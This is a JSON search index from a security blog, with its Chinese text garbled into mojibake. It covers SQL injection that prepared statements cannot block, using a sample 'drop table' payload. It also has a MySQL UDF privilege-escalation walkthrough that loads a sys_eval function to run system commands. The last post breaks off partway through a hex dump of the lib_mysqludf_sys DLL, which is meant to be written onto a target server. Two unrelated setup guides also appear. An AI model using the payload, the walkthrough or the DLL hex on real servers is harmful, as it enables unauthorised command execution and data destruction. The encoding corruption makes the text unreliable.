ä½†æ˜¯ï¼Œé‡ç‚¹æ¥äº†ï¼Œé¢„ç¼–è¯‘çœŸçš„èƒ½å®Œç¾é˜²å¾¡SQLæ³¨å…¥å—ï¼Ÿ é¢„ç¼–è¯‘ä¹‹å¤–çš„æ³¨å…¥ åˆšåˆšæåˆ°ï¼Œé¢„ç¼–è¯‘æ˜¯å°†sqlè¯­å¥å‚æ•°åŒ–ï¼Œåˆšåˆšçš„ä¾‹å­ä¸­ whereè¯­å¥ä¸­çš„å†…å®¹æ˜¯è¢«å‚æ•°åŒ–çš„ã€‚è¿™å°±æ˜¯è¯´ï¼Œé¢„ç¼–è¯‘ä»…ä»…åªèƒ½é˜²å¾¡ä½å¯å‚æ•°åŒ–ä½ç½®çš„sqlæ³¨å…¥ã€‚é‚£ä¹ˆï¼Œå¯¹äºä¸å¯å‚æ•°åŒ–çš„ä½ç½®ï¼Œé¢„ç¼–è¯‘å°†æ²¡æœ‰ä»»ä½•åŠæ³• ä¸å¯å‚æ•°åŒ–çš„ä½ç½®ï¼š è¡¨åã€åˆ—å order byã€group by limit join æˆ‘ä»¬ä»¥order byä¸¾ä¾‹ï¼Œç°åœ¨æœ‰ä¸€ä¸ªsqlè¯­å¥å¦‚ä¸‹ï¼ˆä»¥ä¸‹ä¸ºä¼ªä»£ç ï¼‰ SELECT * FROM users ORDER BY user_input; å…¶ä¸­user_inputæ˜¯ä¼ é€’è¿‡æ¥çš„å‚æ•°ï¼Œä¾‹å¦‚ id SELECT * FROM users ORDER BY id; è¿™ä¸ªè¯­å¥æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯å¦‚æœuser_inputè¾“å…¥ id;drop table users -- SELECT * FROM users ORDER BY id;drop table users -- è¿™æ ·å°±è¢«æˆåŠŸæ³¨å…¥äº†ï¼Œè€Œè¿™ç§ä½ç½®æ˜¯ä¸å¯è¢«å‚æ•°åŒ–çš„ï¼Œæ‰€ä»¥æ˜¯æ— æ³•é€šè¿‡é¢„ç¼–è¯‘é˜²å¾¡çš„ order byåä¸€èˆ¬æ˜¯æ¥å­—æ®µåï¼Œè€Œå­—æ®µåæ˜¯ä¸èƒ½å¸¦å¼•å·çš„ï¼Œæ¯”å¦‚ order by username;å¦‚æœå¸¦ä¸Šå¼•å·æˆäº†order by 'username'ï¼Œé‚£usernameå°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ä¸æ˜¯å­—æ®µåäº†ï¼Œè¿™å°±äº§ç”Ÿäº†è¯­æ³•é”™è¯¯ã€‚ æ‰€ä»¥order byåä¸èƒ½å‚æ•°åŒ–çš„æœ¬è´¨æ˜¯ï¼šä¸€æ–¹é¢é¢„ç¼–è¯‘åˆåªæœ‰è‡ªåŠ¨åŠ å¼•å·çš„setString()æ–¹æ³•ï¼Œæ²¡æœ‰ä¸åŠ å¼•å·çš„æ–¹æ³•ï¼›è€Œå¦ä¸€æ–¹é¢order byåæ¥çš„å­—æ®µåä¸èƒ½æœ‰å¼•å· å¦‚ä½•é˜²å¾¡ å¯¹äºsqlæ³¨å…¥å­˜åœ¨ä¸¤ç§æƒ…å†µï¼Œå¯å‚æ•°åŒ–çš„ï¼Œä¸å¯å‚æ•°åŒ–çš„ å¯¹äºå¯å‚æ•°åŒ–æ²¡å•†é‡ï¼Œç›´æ¥é¢„ç¼–è¯‘è§£å†³ä¸€åˆ‡ã€‚ è€Œå¯¹äºä¸å¯å‚æ•°åŒ–çš„ï¼Œåªèƒ½é€šè¿‡è®¾ç½®ç™½åå•ï¼Œè¿‡æ»¤ç‰¹æ®Šç¬¦å·ï¼Œé€šè¿‡åŠ å¼•å·å¼ºåˆ¶è½¬ä¸ºå­—ç¬¦ä¸²ç­‰æ–¹å¼è¿›è¡Œæ‹¦æˆª å‚è€ƒï¼š é¢„ç¼–è¯‘çœŸçš„èƒ½å®Œç¾é˜²å¾¡SQLæ³¨å…¥å—ï¼Ÿ SQLé¢„ç¼–è¯‘â€”â€”é¢„ç¼–è¯‘çœŸçš„èƒ½å®Œç¾é˜²å¾¡SQLæ³¨å…¥å— æµ…è°ˆé¢„ç¼–è¯‘ä¹‹äºSQLæ³¨å…¥é˜²å¾¡","tags":["æ¼æ´","SQL"],"categories":["æ¼æ´"]},{"title":"è§£å†³Ubuntuä¸Windowsé—´æ— æ³•å¤åˆ¶ç²˜è´´é—®é¢˜","path":"/2025/08/12/è§£å†³Ubuntuä¸Windowsé—´æ— æ³•å¤åˆ¶ç²˜è´´é—®é¢˜/","content":"è§£å†³Ubuntuä¸Windowsé—´æ— æ³•å¤åˆ¶ç²˜è´´é—®é¢˜ open-vm-tools æ˜¯åœ¨ VMware è™šæ‹Ÿæœºä¸­æä¾›ä¸å®¿ä¸»æœºäº¤äº’çš„å·¥å…·åŒ…ï¼Œæ¯”å¦‚ï¼š è‡ªåŠ¨è°ƒæ•´è™šæ‹Ÿæœºåˆ†è¾¨ç‡ æ–‡ä»¶å¤¹å…±äº« å‰ªè´´æ¿å…±äº«ï¼ˆå®¿ä¸»æœºä¸è™šæ‹Ÿæœºä¹‹é—´ï¼‰ æ€§èƒ½ä¼˜åŒ–ç­‰ ç›´æ¥åœ¨ubuntuå‘½ä»¤è¡Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ sudo apt-get autoremove open-vm-tools //å¸è½½å·²æœ‰çš„å·¥å…·sudo apt-get install open-vm-tools //å®‰è£…å·¥å…·open-vm-toolssudo apt-get install open-vm-tools-desktop //å®‰è£…open-vm-tools-desktop ä¹‹åé‡å¯å³å¯ï¼š sudo reboot","tags":["è™šæ‹Ÿæœº","ubuntu"],"categories":["ubuntu"]},{"title":"Github Pagesç»‘å®šåŸŸå","path":"/2025/08/12/Github-Pagesç»‘å®šåŸŸå/","content":"Github Pagesç»‘å®šåŸŸå ä¸ç»å†æ’•å¿ƒè£‚è‚ºçš„ç—›è‹¦ä¸ç­‹ç–²åŠ›å°½çš„æŒ£æ‰ï¼Œæ€èƒ½ç ´èŒ§æˆè¶ï¼Œå®ç°æ¶…æ§ƒé‡ç”Ÿï¼Ÿ åŸŸåæ³¨å†Œ è¿›å…¥é˜¿é‡Œäº‘å®˜ç½‘ï¼Œå…ˆåˆ°åŸŸåæ³¨å†Œé¡µé¢è´­ä¹°è‡ªå·±å¿ƒä»ªçš„åŸŸå æ–°ç”¨æˆ·éœ€è¦è¿›è¡Œå®åè®¤è¯ï¼Œåœ¨è®¢å•è¯¦æƒ…é¡µæœ‰ç›¸å…³æç¤ºè¿›è¡Œè®¤è¯å³å¯ï¼Œä¸€èˆ¬10åˆ†é’Ÿå†…å¯å®¡æ ¸é€šè¿‡ï¼Œå®åè®¤è¯æˆåŠŸåï¼Œå¯ç›´æ¥è´­ä¹°åŸŸåï¼Œé€‰æ‹©æ”¯ä»˜å®æ”¯ä»˜å³å¯ åŸŸåè§£æ å½“åŸŸåçŠ¶æ€æ˜¾ç¤ºä¸º æ­£å¸¸ æ—¶ï¼Œå¼€å§‹è¿›è¡Œ åŸŸåè§£æï¼Œç‚¹å‡»å³ä¾§æ“ä½œä¸­çš„ è§£æè®¾ç½® è¿›å…¥äº‘è§£æ DNS é¡µé¢ ç‚¹å‡»æ·»åŠ è®°å½•ï¼Œæ·»åŠ ä¸€æ¡ A è®°å½•å’Œä¸€æ¡ CNAME è®°å½•ï¼Œå¡«å†™å¦‚ä¸‹ï¼š é™„1ï¼šä¸»æœºè®°å½•è¯´æ˜ é™„2ï¼šè®°å½•ç±»å‹ ç‰¹åˆ«æ³¨æ„Aè®°å½•æ—¶å°†åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€ï¼Œå…¶è®°å½•å€¼é€‰æ‹©githubå®˜æ–¹IPï¼š 185.199.108.153185.199.109.153185.199.110.153185.199.111.153 ä¸Šé¢4ä¸ªéšä¾¿é€‰ä¸€ä¸ªå³å¯ åŸŸåç»‘å®š å…ˆGithub ä»“åº“çš„ CNAME æ–‡ä»¶ä¸­æ–°å¢ä¸€æ¡æŒ‡ä»¤ï¼š å‰å¾€Github Pageå·²æ­å»ºå¥½çš„ä»“åº“ä¸­ï¼Œç‚¹å‡»settingsâ†’ pageâ†’Custom domain é¡¹ä¸­æ·»åŠ è¿›è¡Œè§£æåçš„è‡ªå®šä¹‰åŸŸåâ†’ å‹¾é€‰ Enforce HTTPS è¿™æ ·Github Pageså°±ç»‘å®šåŸŸåäº† ä½ ä»¥ä¸ºè¿™æ ·å°±å¥½äº†å—ğŸ˜›ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ å®åˆ™ä¸ç„¶ï¼Œä½ ä¼šé‡åˆ°æ¯æ¬¡ä½¿ç”¨hexo deployéƒ¨ç½²ä¹‹åï¼Œgithub pageçš„custom domianè‡ªå®šä¹‰åŸŸåå°±ä¼šå¤±æ•ˆ è¿™æ—¶ï¼Œåªéœ€åœ¨hexoé¡¹ç›®çš„sourceæ–‡ä»¶å¤¹ä¸‹æ–°å»ºCNAMEæ–‡ä»¶ï¼Œé‡Œé¢å¡«å…¥ä½ çš„åŸŸåï¼Œå¹¶ä¿å­˜ï¼Œè¿™æ ·æ¯æ¬¡hexo deployåï¼Œgithub pageå°±ä¸ä¼šå‡ºç°åŸŸåé‡ç½®äº†","tags":["åšå®¢ç¾åŒ–"],"categories":["åšå®¢ç¾åŒ–"]},{"title":"MySQL UDFææƒ","path":"/2025/08/08/MySQL UDFææƒ/","content":"æœ¬æ–‡è§£æWindowsç¯å¢ƒä¸‹çš„MySQL UDFææƒ MySQL UDFææƒ Windowsç¯å¢ƒä¸‹ æ¦‚è¿° æœ‰æ—¶å€™æˆ‘ä»¬é€šè¿‡ä¸€äº›æ–¹å¼è·å–äº†ç›®æ ‡ä¸»æœºmysqlçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”å¯ä»¥è¿œç¨‹è¿æ¥ï¼Œæˆ‘ä»¬è¿œç¨‹ç™»å½•ä¸ŠmysqlæœåŠ¡å™¨ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬æƒ³é€šè¿‡mysqlæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥è€ƒè™‘UDFè¿›è¡Œææƒ UDFï¼ˆUser Defined Functionï¼‰ï¼šç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå…¶ä¸ºMySQLçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼Œå¯ä»¥ä½¿ç”¨UDFä¸ºMySQLå¢æ·»ä¸€äº›å‡½æ•° å‰ææ¡ä»¶ è·å–mysqlæ§åˆ¶æƒé™ï¼šçŸ¥é“mysqlç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”å¯ä»¥è¿œç¨‹ç™»å½•ï¼ˆå³è·å–äº†mysqlæ•°æ®åº“çš„æƒé™ï¼‰ mysqlå…·æœ‰å†™å…¥æ–‡ä»¶çš„æƒé™ï¼šmysqlæœ‰å†™å…¥æ–‡ä»¶çš„æƒé™ï¼Œå³secure_file_privçš„å€¼ä¸ºç©º mysqlææƒè·å–åˆ°çš„æƒé™å¤§å°è·Ÿè¿è¡Œmysqlæ‰€åœ¨æœåŠ¡å™¨ç™»å½•çš„è´¦å·çš„æƒé™ç›¸å…³ï¼Œå¦‚æ“ä½œç³»ç»Ÿä»¥æ™®é€šç”¨æˆ·ç™»å½•çš„å¹¶å¯åŠ¨mysqlï¼Œç»udfææƒåä¹Ÿåªèƒ½è·å–åˆ°ç³»ç»Ÿçš„æ™®é€šç”¨æˆ·æƒé™ã€‚è€Œä½¿ç”¨ç®¡ç†å‘˜ç™»å½•æ“ä½œç³»ç»Ÿè¿è¡Œmysqlï¼Œææƒåè·å–çš„æƒé™åˆ™ä¸ºç³»ç»Ÿç®¡ç†å‘˜æƒé™ æ‰‹å·¥ææƒ æŸ¥çœ‹MySQLæ˜¯å¦æœ‰å†™å…¥æ–‡ä»¶çš„æƒé™ mysql show global variables like %secure%;+--------------------------+-------+| Variable_name | Value |+--------------------------+-------+| require_secure_transport | OFF || secure_auth | ON || secure_file_priv | |+--------------------------+-------+3 rows in set, 1 warning (0.00 sec) secure_file_privæ˜¯ç”¨æ¥é™åˆ¶load dumpfileã€into outfileã€load_file()å‡½æ•°åœ¨å“ªä¸ªç›®å½•ä¸‹æ‹¥æœ‰ä¸Šä¼ å’Œè¯»å–æ–‡ä»¶çš„æƒé™ã€‚å¦‚ä¸‹å…³äºsecure_file_privçš„é…ç½®ä»‹ç» å½“secure_file_privçš„å€¼ä¸ºnullï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º å½“secure_file_privçš„å€¼ä¸º/tmp/ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ å½“secure_file_privæ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ å¦‚æœsecure_file_privçš„å€¼ä¸æ˜¯ä¸ºç©ºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨mysql/my.iniä¸­æŸ¥çœ‹æ˜¯å¦æœ‰secure_file_priv çš„å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰çš„è¯æˆ‘ä»¬å°±æ·»åŠ  secure_file_priv = ' ' å†™å…¥åŠ¨æ€é“¾æ¥åº“ åŠ¨æ€é“¾æ¥åº“å°±æ˜¯å®ç°å…±äº«å‡½æ•°åº“æ¦‚å¿µçš„ä¸€ç§æ–¹å¼ï¼Œåœ¨Windowsç¯å¢ƒä¸‹åç¼€åä¸º.dllï¼Œåœ¨linuxç¯å¢ƒä¸‹åç¼€åä¸º.soï¼Œæˆ‘ä»¬è¦å°†è¯¥æ–‡ä»¶æ”¾åœ¨ç‰¹å®šçš„ç›®å½•ä¸­ï¼Œè¯¥æ–‡ä»¶ä¸­åŒ…å«äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¸€äº›å‡½æ•° ç‰ˆæœ¬ è·¯å¾„ MySQL 5.0 å¯¼å‡ºè·¯å¾„éšæ„ï¼› 5.0 = MySQL= 5.1 éœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½•ï¼ˆå¦‚ï¼šc:/windows/system32/æˆ–c:/windowsï¼‰ MySQL 5.1 å¿…é¡»å¯¼å‡ºåˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹ æŸ¥çœ‹ç‰ˆæœ¬ mysql select version();+-----------+| version() |+-----------+| 5.7.26 |+-----------+1 row in set (0.00 sec) æŸ¥çœ‹pluginæ‰€åœ¨ç›®å½• mysql show variables like %plugin%;+-------------------------------+----------------------------------------------------+| Variable_name | Value |+-------------------------------+----------------------------------------------------+| default_authentication_plugin | mysql_native_password || plugin_dir | D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\ |+-------------------------------+----------------------------------------------------+2 rows in set, 1 warning (0.01 sec) è™½ç„¶pluginç›®å½•ä¸å­˜åœ¨ä½†æ˜¯è¿™é‡Œä¼šæ˜¾ç¤ºå‡ºæ¥ æˆ‘è¿™è¾¹ç‰ˆæœ¬å¤§äº5.7.26ï¼Œæ‰€ä»¥æ”¾åœ¨/lib/pluginä¸‹ï¼Œä½†éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œç½‘ä¸Šè¯´å¯ä»¥ç»“åˆntfsç‰¹æ€§å®ç°ç”¨MySQLåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä½†æ˜¯æˆ‘è¿™è¾¹å°è¯•å¤±è´¥ï¼Œä¸ºäº†å®éªŒéœ€è¦ï¼Œæˆ‘è‡ªå·±åˆ›å»ºä¸€ä¸ªpluginæ–‡ä»¶å¤¹ æŸ¥çœ‹ç³»ç»Ÿæ¶æ„ mysql show variables like %compile%;+-------------------------+--------+| Variable_name | Value |+-------------------------+--------+| version_compile_machine | x86_64 || version_compile_os | Win64 |+-------------------------+--------+2 rows in set, 1 warning (0.00 sec) å¦‚ä¸Šæ˜¾ç¤ºmysqlæ˜¯64ä½ï¼Œæ“ä½œç³»ç»Ÿæ˜¯x86_64 è¿™é‡Œæˆ‘ä»¬ä¸Šä¼ 64ä½çš„dllæ–‡ä»¶ ç›´æ¥å†™å…¥16è¿›åˆ¶æ•°æ®ï¼š MySQL UDFææƒ16è¿›åˆ¶æŸ¥è¯¢ | Ziekun åˆ›å»ºè‡ªå®šä¹‰å‡½æ•° ä¸Šä¼ ä¹‹åï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åˆ›å»ºè‡ªå®šä¹‰å‡½æ•° create function sys_eval returns string soname udf.dll; åªæœ‰ä¸¤ä¸ªå˜é‡ï¼š ä¸€ä¸ªæ˜¯å‡½æ•°åï¼Œæˆ‘ä»¬å¼•å…¥çš„å‡½æ•°æ˜¯ sys_eval ä¸€ä¸ªæ˜¯å…±äº«åŒ…åç§°ï¼Œå³ udf.dll æ³¨æ„ï¼šè‡ªå®šä¹‰å‡½æ•°å¹¶ä¸æ˜¯éšä¾¿å‘½åçš„ï¼Œå…¶åç§°è¦dllæ–‡ä»¶ä¸­æˆ‘ä»¬è‡ªå®šä¹‰å‡½æ•°åç§°ä¸€æ · ç„¶åä½¿ç”¨å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æ–°å¢sys_evalå‡½æ•° mysql select * from mysql.func;+----------+-----+---------+----------+| name | ret | dl | type |+----------+-----+---------+----------+| sys_eval | 0 | udf.dll | function |+----------+-----+---------+----------+1 row in set (0.00 sec) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ mysql select sys_eval(whoami);+----------------------+| sys_eval(whoami) |+----------------------+| laptop-fiogpvd7\\asus |+----------------------+1 row in set (0.62 sec) åˆ é™¤è‡ªå®šä¹‰å‡½æ•° drop function sys_eval; UDF shell å‡è®¾ç›®æ ‡ MySQL åœ¨å†…ç½‘æƒ…å†µä¸‹ï¼Œæ— æ³•ç›´è¿ MySQL æˆ–è€… MySQL ä¸å…è®¸å¤–è¿ï¼Œè¿™ä¸ªæ—¶å€™ä¸€äº›ç½‘é¡µè„šæœ¬å°±æ¯”è¾ƒæ–¹ä¾¿å¥½ç”¨äº† t00ls UDF.PHP ç®€å•æ–¹ä¾¿ï¼Œä¸€é”® DUMP UDF å’Œå‡½æ•°ï¼Œæ“ä½œé—¨æ§›é™ä½äº†å¾ˆå¤š ä½¿ç”¨æ—¶å°†udf.phpæ”¾åœ¨WWWç›®å½•ä¸‹ï¼Œè®¿é—®127.0.0.1/udf.phpï¼Œç™»å½•åï¼š ä¹Ÿå¯ä»¥ç”¨Navicat MySQL ä¸­æ–‡å­—ç¬¦ç¼–ç é—®é¢˜ åœ¨ä¸­æ–‡Windowsç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œcmd.exeé»˜è®¤ä½¿ç”¨GBKå­—ç¬¦é›†è¿›è¡Œè¾“å…¥è¾“å‡ºå¤„ç†ï¼Œè¿™æ„å‘³ç€ï¼š ä»æ•°æ®åº“ä¼ é€’ç»™cmdçš„å‘½ä»¤å‚æ•°å¿…é¡»æ˜¯GBKç¼–ç  cmdæ‰§è¡Œç»“æœçš„è¾“å‡ºä¹Ÿæ˜¯GBKç¼–ç  å¦‚æœå­—ç¬¦é›†ä¸åŒ¹é…ï¼Œå°±ä¼šå‡ºç°ä¹±ç æˆ–å‘½ä»¤æ‰§è¡Œå¤±è´¥ è¾“å‡ºç»“æœç¼–ç é”™è¯¯ åœ¨ä¸­æ–‡Windowsç¯å¢ƒä¸‹MySQL UDFææƒä¸­ï¼Œæœ€å¸¸è§çš„é—®é¢˜æ˜¯æ‰§è¡Œç»“æœçš„ç¼–ç é—®é¢˜ï¼š select sys_eval(dir F:\\\\); å¯¹åº”çš„è§£å†³åŠæ³•å¾ˆç®€å•ï¼Œudfå‡½æ•°å¤–åŠ ä¸€å±‚ç¼–ç è½¬åŒ–çš„å‡½æ•° select convert(sys_eval(dir F:\\\\) using gbk); å‘½ä»¤ä¸­éASCIIå­—ç¬¦å¤„ç† å½“å‘½ä»¤å‚æ•°åŒ…å«ä¸­æ–‡ï¼Œç”±äºMySQLè¾“å…¥ä¼šæ ¹æ®é»˜è®¤å­—ç¬¦é›†(utf8mb4/latin1)ç¼–ç å¯¹åº”çš„å‘½ä»¤è¿›å…¥å‘½ä»¤è¡Œè§£é‡Šå™¨ select convert(sys_eval(dir F:\\\\é»‘å­) using gbk); å‘ç°ä¸­æ–‡æ¶ˆå¤±ä¸è§äº†ï¼Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿ 16è¿›åˆ¶ç¼–ç  ä½¿ç”¨CyberChefå°†å‘½ä»¤è½¬æ¢ä¸ºå¯¹åº”ç¼–ç çš„åå…­è¿›åˆ¶ ç„¶åä½¿ç”¨åå…­è¿›åˆ¶æ›¿ä»£åŸæœ‰çš„å­—ç¬¦ä¸²ï¼Œé˜²æ­¢MySQLå› ä¸ºé»˜è®¤ç¼–ç é—®é¢˜å¯¼è‡´çš„å«æœ‰ä¸­æ–‡å‘½ä»¤æ‰§è¡Œé”™è¯¯é—®é¢˜ æ³¨æ„ï¼š16è¿›åˆ¶ç¼–ç æ—¶ä¸ç”¨å¤šåŠ ä¸ª\\è¿›è¡Œè½¬ä¹‰ select convert(sys_eval(0x64697220463a5cbadad7d3) using gbk); ç¼–ç å‡½æ•° æ—¢ç„¶åˆæ˜¯ç¼–ç é—®é¢˜ï¼Œé‚£å†æ¬¡ä½¿ç”¨MySQLçš„ç¼–ç è½¬åŒ–çš„å‡½æ•°ä¸å°±å¥½äº†å—ï¼Ÿä½•å¿…è½¬æˆ16è¿›åˆ¶è¿™ä¹ˆéº»çƒ¦ select convert(sys_eval(convert(dir F:\\\\é»‘å­ using gbk)) using gbk); å‚è€ƒï¼š Mysqlä¹‹UDFææƒ | ç™½æ³½ MySQL UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ | ç™½æ³½ MySQL æ¼æ´åˆ©ç”¨ä¸ææƒ | å›½å…‰ Sqlæ³¨å…¥-Windowsä¸‹åˆ©ç”¨udfææƒ åˆ©ç”¨MySQL UDFè¿›è¡Œçš„ä¸€æ¬¡æ¸—é€æµ‹è¯• æ•°æ®åº“ææƒä¸­çš„å­—ç¬¦é›†æŒ‘æˆ˜ | Wells","tags":["MySQL","ææƒ","UDF"],"categories":["MySQL","ææƒ"]},{"title":"MySQL UDFææƒ16è¿›åˆ¶æŸ¥è¯¢","path":"/2025/08/06/MySQL-UDFææƒ16è¿›åˆ¶æŸ¥è¯¢/","content":"æœ¬æ–‡æä¾›UDFææƒä¸­dllæ–‡ä»¶æŸ¥è¯¢ä½¿ç”¨ MySQL UDFææƒ16è¿›åˆ¶æŸ¥è¯¢ WindowsLinuxlib_mysqludf_sys_32.dll SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb